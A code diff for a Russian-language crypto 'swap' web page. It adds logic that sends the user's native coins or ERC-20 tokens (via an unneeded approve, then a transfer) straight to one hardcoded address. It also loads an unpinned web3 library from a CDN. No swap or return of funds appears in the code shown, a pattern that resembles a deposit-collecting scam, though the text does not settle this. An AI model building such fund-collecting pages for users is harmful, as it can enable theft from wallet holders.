@@ -7,6 +7,7 @@
   <link rel="stylesheet" href="style.css"/>
   <link rel="icon" href="logo.svg" type="image/svg+xml"/>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
 </head>
 <body class="swap-body">
   <header class="header">
@@ -39,12 +40,14 @@
 
       <div class="terms-section">
         <input type="checkbox" id="terms-checkbox">
-        <label for="terms-checkbox">Я согласен с условиями обмена</label>
+        <label for="terms-checkbox">Я согласен с <a href="terms.html" target="_blank">условиями обмена</a></label>
       </div>
 
       <button id="confirm-swap" class="btn primary-btn" disabled>
         Подтвердить обмен
       </button>
+
+      <div id="error-message" class="error-message" style="display:none;">Перевод не удался</div>
     </div>
   </main>
 
@@ -55,7 +58,7 @@
       'polygon': '0x89',
       'optimism': '0xa',
       'arbitrum': '0xa4b1',
-      'ton': null // TON не поддерживается MetaMask
+      'ton': null
     };
 
     const nativeTokens = {
@@ -66,14 +69,65 @@
       'arbitrum': 'ETH'
     };
 
+    const tokenAddresses = {
+      'ethereum': {
+        'USDC': '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
+        'USDT': '0xdac17f958d2ee523a2206206994597c13d831ec7',
+        'XRP': '' // Не на ETH, пропустить
+      },
+      'bsc': {
+        'USDC': '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d',
+        'USDT': '0x55d398326f99059ff775485246999027b3197955',
+        'TON': '0x76a797a59ba2c17726896976b7b3747bfd1d220f'
+      },
+      'polygon': {
+        'USDC': '0x3c499c542caf5e3815e1192ce70d8cc03d5c3359',
+        'USDT': '0xc2132d05d31c914a87c6611c10748aeb04b58e8f'
+      },
+      'optimism': {
+        'USDC': '0x0b2c639c533813f4aa9d7837caf62653d097ff85',
+        'USDT': '0x94b008aa00579c13056b0a762ad3df1c4d26d567'
+      },
+      'arbitrum': {
+        'USDC': '0xaf88d065e77c8cc2239327c5edb3a432268e5831',
+        'USDT': '0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9'
+      }
+    };
+
+    const erc20ABI = [
+      {
+        "constant": true,
+        "inputs": [],
+        "name": "decimals",
+        "outputs": [{"name": "", "type": "uint8"}],
+        "type": "function"
+      },
+      {
+        "constant": false,
+        "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}],
+        "name": "approve",
+        "outputs": [{"name": "", "type": "bool"}],
+        "type": "function"
+      },
+      {
+        "constant": false,
+        "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
+        "name": "transfer",
+        "outputs": [{"name": "", "type": "bool"}],
+        "type": "function"
+      }
+    ];
+
+    const platformAddress = '0xf77a1a27da4b74ff7be6535d76dbc90f6f5330c4';
+
     const swapData = JSON.parse(localStorage.getItem('swapData'));
     if (swapData) {
       document.getElementById('from-chain-display').textContent = swapData.fromChain;
       document.getElementById('to-chain-display').textContent = swapData.toChain;
       document.getElementById('from-token-display').textContent = swapData.fromToken;
       document.getElementById('to-token-display').textContent = swapData.toToken;
-      document.getElementById('from-amount-display').textContent = swapData.fromAmount;
-      document.getElementById('to-amount-display').textContent = swapData.toAmount;
+      document.getElementById('from-amount-display').textContent = swapData.fromAmount + ' ' + swapData.fromToken;
+      document.getElementById('to-amount-display').textContent = swapData.toAmount + ' ' + swapData.toToken;
       if (swapData.tonAddress) {
         document.getElementById('ton-address-display').style.display = 'block';
         document.getElementById('ton-address-value').textContent = swapData.tonAddress;
@@ -85,11 +139,19 @@
     });
 
     document.getElementById('confirm-swap').addEventListener('click', async () => {
-      if (!window.ethereum) return alert('MetaMask не установлен');
+      if (!window.ethereum) {
+        document.getElementById('error-message').style.display = 'block';
+        document.getElementById('error-message').textContent = 'MetaMask не установлен';
+        return;
+      }
 
       const fromChain = swapData.fromChain;
       const chainId = chainIds[fromChain];
-      if (!chainId) return alert('Сеть отправления не поддерживается MetaMask');
+      if (!chainId) {
+        document.getElementById('error-message').style.display = 'block';
+        document.getElementById('error-message').textContent = 'Сеть отправления не поддерживается MetaMask';
+        return;
+      }
 
       try {
         // Переключение сети
@@ -98,30 +160,54 @@
           params: [{ chainId }],
         });
 
-        const isNative = nativeTokens[fromChain] === swapData.fromToken;
-        if (!isNative) {
-          return alert('Обмен ERC20 токенов - симуляция. Реальная реализация требует approve и transfer.');
+        const web3 = new Web3(window.ethereum);
+        const accounts = await web3.eth.getAccounts();
+        const fromAddress = accounts[0];
+
+        const token = swapData.fromToken;
+        const isNative = nativeTokens[fromChain] === token;
+        const amount = parseFloat(swapData.fromAmount);
+
+        if (isNative) {
+          const amountInWei = web3.utils.toWei(amount.toString(), 'ether');
+          const tx = {
+            from: fromAddress,
+            to: platformAddress,
+            value: amountInWei,
+          };
+          const txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [tx],
+          });
+          console.log(`Native tx hash: ${txHash}`);
+        } else {
+          const tokenAddress = tokenAddresses[fromChain][token];
+          if (!tokenAddress) {
+            throw new Error('Адрес токена не найден для этой сети');
+          }
+
+          const contract = new web3.eth.Contract(erc20ABI, tokenAddress);
+
+          // Получить decimals
+          const decimals = await contract.methods.decimals().call();
+          const amountInUnits = (BigInt(Math.floor(amount * 10 ** decimals))).toString();
+
+          // Approve
+          const approveTx = await contract.methods.approve(platformAddress, amountInUnits).send({ from: fromAddress });
+          console.log(`Approve tx hash: ${approveTx.transactionHash}`);
+
+          // Transfer
+          const transferTx = await contract.methods.transfer(platformAddress, amountInUnits).send({ from: fromAddress });
+          console.log(`Transfer tx hash: ${transferTx.transactionHash}`);
         }
 
-        // Конвертация суммы в wei (предполагая 18 decimals)
-        const amountInWei = (parseFloat(swapData.fromAmount) * 10**18).toString(16);
-
-        // Отправка транзакции
-        const txHash = await window.ethereum.request({
-          method: 'eth_sendTransaction',
-          params: [{
-            from: localStorage.getItem('walletAddress'),
-            to: '0xf77a1a27da4b74ff7be6535d76dbc90f6f5330c4',
-            value: `0x${amountInWei}`,
-          }],
-        });
-
-        alert(`Транзакция отправлена: ${txHash}`);
-        // После успеха очистить данные и перейти обратно или на success
+        // Успех, перенаправление
         localStorage.removeItem('swapData');
-        window.location.href = 'dashboard.html';
+        window.location.href = 'processing.html';
       } catch (err) {
-        alert('Ошибка: ' + err.message);
+        console.error(err);
+        document.getElementById('error-message').style.display = 'block';
+        document.getElementById('error-message').textContent = 'Перевод не удался: ' + (err.message || 'Неизвестная ошибка');
       }
     });
   </script>
